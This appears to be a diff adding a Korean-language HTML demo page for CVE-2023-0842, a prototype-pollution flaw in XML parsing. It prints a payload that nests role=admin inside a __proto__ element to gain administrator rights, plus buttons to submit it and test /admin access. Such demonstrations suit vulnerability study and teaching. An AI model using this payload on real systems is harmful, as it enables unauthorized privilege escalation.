@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CVE-2023-0842 Demo</title>
+    <style>
+        body { font-family: Arial; margin: 20px; }
+        .container { max-width: 800px; margin: 0 auto; }
+        textarea { width: 100%; height: 100px; margin: 10px 0; }
+        button { padding: 5px 10px; margin: 5px; }
+        .result { margin-top: 10px; padding: 10px; background: #f0f0f0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>CVE-2023-0842 취약점 데모</h1>
+        <div id="userInfo"></div>
+        <hr>
+
+        <h2>프로필 수정</h2>
+        <div>
+            <p>일반적인 시도 (실패):</p>
+            <pre>&lt;role&gt;admin&lt;/role&gt;</pre>
+            <p>Prototype Pollution 공격 (성공):</p>
+            <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;__proto__&gt;
+    &lt;role&gt;admin&lt;/role&gt;
+&lt;/__proto__&gt;</pre>
+        </div>
+        <textarea id="xmlData" placeholder="여기에 XML을 입력하세요..."></textarea>
+        <button onclick="updateProfile()">프로필 업데이트</button>
+        <hr>
+
+        <h2>관리자 페이지 테스트</h2>
+        <button onclick="checkAdmin()">관리자 페이지 접속</button>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        // 사용자 정보 업데이트
+        async function updateUserInfo() {
+            const response = await fetch('/api/user');
+            const user = await response.json();
+            document.getElementById('userInfo').innerHTML = 
+                `현재 사용자: ${user.name} (${user.role})`;
+        }
+
+        // 프로필 업데이트
+        async function updateProfile() {
+            const xml = document.getElementById('xmlData').value;
+            try {
+                const response = await fetch('/api/update-profile', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/xml' },
+                    body: xml
+                });
+                const result = await response.json();
+                document.getElementById('result').innerHTML = 
+                    '<pre>' + JSON.stringify(result, null, 2) + '</pre>';
+                    
+                if(result.success) {
+                    updateUserInfo();
+                }
+            } catch (err) {
+                document.getElementById('result').innerHTML = '오류 발생: ' + err.message;
+            }
+        }
+
+        // 관리자 페이지 접근
+        async function checkAdmin() {
+            try {
+                const response = await fetch('/admin');
+                const result = await response.json();
+                document.getElementById('result').innerHTML = 
+                    '<pre>' + JSON.stringify(result, null, 2) + '</pre>';
+            } catch (err) {
+                document.getElementById('result').innerHTML = '오류 발생: ' + err.message;
+            }
+        }
+
+        // 초기 사용자 정보 로드
+        updateUserInfo();
+    </script>
+</body>
+</html>
